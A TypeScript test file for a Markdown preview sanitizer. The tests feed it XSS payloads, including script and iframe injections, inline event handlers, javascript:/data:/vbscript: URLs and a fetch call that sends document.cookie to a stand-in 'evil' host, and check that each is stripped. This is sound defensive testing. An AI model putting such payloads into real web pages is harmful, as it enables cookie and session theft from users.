// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Agent Profile Compiler contributors

import assert from "node:assert/strict";
import test from "node:test";

import { sanitizeMarkdownForPreview } from "./markdownSanitizer";

test("sanitizer strips a paired <script> tag including its body", () => {
  const out = sanitizeMarkdownForPreview(
    "before <script>alert('xss')</script> after",
  );
  assert.equal(out.includes("script"), false);
  assert.equal(out.includes("alert"), false);
  assert.match(out, /before/u);
  assert.match(out, /after/u);
});

test("sanitizer strips a self-closing <script src=...> with no body", () => {
  const out = sanitizeMarkdownForPreview(
    'hi <script src="https://evil.example/x.js"></script> bye',
  );
  assert.equal(out.includes("script"), false);
  assert.equal(out.includes("evil.example"), false);
});

test("sanitizer strips <iframe> tags", () => {
  const out = sanitizeMarkdownForPreview(
    '<iframe src="https://evil.example"></iframe>visible',
  );
  assert.equal(out.includes("iframe"), false);
  assert.equal(out.includes("evil.example"), false);
  assert.match(out, /visible/u);
});

test("sanitizer neutralizes inline event handlers", () => {
  const out = sanitizeMarkdownForPreview('<a href="#" onclick="bad()">click</a>');
  assert.equal(out.toLowerCase().includes("onclick"), false);
  assert.equal(out.includes("bad("), false);
});

test("sanitizer neutralizes onmouseover handlers with single quotes", () => {
  const out = sanitizeMarkdownForPreview(
    "<img src='ok.png' onmouseover='steal()' />",
  );
  assert.equal(out.toLowerCase().includes("onmouseover"), false);
  assert.equal(out.includes("steal("), false);
});

test("sanitizer rejects javascript: URLs in href", () => {
  const out = sanitizeMarkdownForPreview('<a href="javascript:alert(1)">x</a>');
  assert.equal(out.toLowerCase().includes("javascript:"), false);
  assert.match(out, /blocked-by-sanitizer/u);
});

test("sanitizer rejects javascript: URLs even with leading whitespace", () => {
  const out = sanitizeMarkdownForPreview('<a href="  javascript:alert(1)">x</a>');
  assert.equal(out.toLowerCase().includes("javascript:"), false);
});

test("sanitizer rejects data: URLs in src attributes", () => {
  const out = sanitizeMarkdownForPreview(
    '<img src="data:text/html;base64,PHNjcmlwdD4=">',
  );
  assert.equal(out.toLowerCase().includes("data:"), false);
});

test("sanitizer rejects vbscript: URLs", () => {
  const out = sanitizeMarkdownForPreview('<a href="vbscript:MsgBox(1)">x</a>');
  assert.equal(out.toLowerCase().includes("vbscript:"), false);
});

test("sanitizer rejects remote https:// resource loads in src", () => {
  const out = sanitizeMarkdownForPreview('<img src="https://tracker.example/p.gif">');
  assert.equal(out.includes("tracker.example"), false);
  assert.match(out, /blocked-by-sanitizer/u);
});

test("sanitizer rejects remote http:// resource loads", () => {
  const out = sanitizeMarkdownForPreview(
    '<link rel="stylesheet" href="http://untrusted/a.css">',
  );
  // The whole <link> is also dropped because it's on the forbidden tag list.
  assert.equal(out.toLowerCase().includes("<link"), false);
  assert.equal(out.includes("untrusted"), false);
});

test("sanitizer strips <object>, <embed>, <style>, <meta>, <base>", () => {
  for (const tag of ["object", "embed", "style", "meta", "base"]) {
    const out = sanitizeMarkdownForPreview(`<${tag}>x</${tag}>`);
    assert.equal(out.toLowerCase().includes(`<${tag}`), false, tag);
  }
});

test("sanitizer escapes HTML special characters in plain text", () => {
  const out = sanitizeMarkdownForPreview("a < b && c > d");
  assert.match(out, /a &lt; b &amp;&amp; c &gt; d/u);
});

test("sanitizer escapes quote characters", () => {
  const out = sanitizeMarkdownForPreview(`he said "hi" and 'bye'`);
  assert.match(out, /&quot;hi&quot;/u);
  assert.match(out, /&#39;bye&#39;/u);
});

test("sanitizer escapes a previously-stripped tag's leftover text", () => {
  // Even if a defective renderer somehow reintroduced angle brackets, the
  // escaped output must not contain a literal `<script>` after sanitization.
  const out = sanitizeMarkdownForPreview("plain <em>markdown</em> text");
  assert.equal(out.includes("<em>"), false);
  assert.match(out, /&lt;em&gt;markdown&lt;\/em&gt;/u);
});

test("sanitizer accepts Uint8Array input", () => {
  const bytes = new TextEncoder().encode("safe text");
  const out = sanitizeMarkdownForPreview(bytes);
  assert.equal(out, "safe text");
});

test("sanitizer snapshot: malicious Markdown with multiple vectors", () => {
  // Phase 16 spec test: "malicious Markdown sanitization snapshot with
  // <script> and inline event handlers".
  const malicious = [
    "# Title",
    "",
    "<script>fetch('//evil/'+document.cookie)</script>",
    "",
    "<img src=x onerror=alert(1)>",
    "",
    '<a href="javascript:alert(1)">click</a>',
    "",
    '<iframe src="https://attacker.example"></iframe>',
    "",
    "plain *italic* text",
  ].join("\n");

  const out = sanitizeMarkdownForPreview(malicious);

  // None of these substrings may appear in the sanitized output, in any
  // case. The snapshot is the conjunction of these invariants — if a
  // future regression reintroduces any vector, this test fails immediately.
  for (const forbidden of [
    "script",
    "onerror",
    "javascript:",
    "iframe",
    "attacker.example",
    "alert(1)",
    "document.cookie",
  ]) {
    assert.equal(
      out.toLowerCase().includes(forbidden.toLowerCase()),
      false,
      `sanitized output must not contain "${forbidden}"; got: ${out}`,
    );
  }

  // The literal Markdown headline content survives (escaped) so the user
  // still sees the file structure when previewing.
  assert.match(out, /# Title/u);
  assert.match(out, /plain \*italic\* text/u);
});
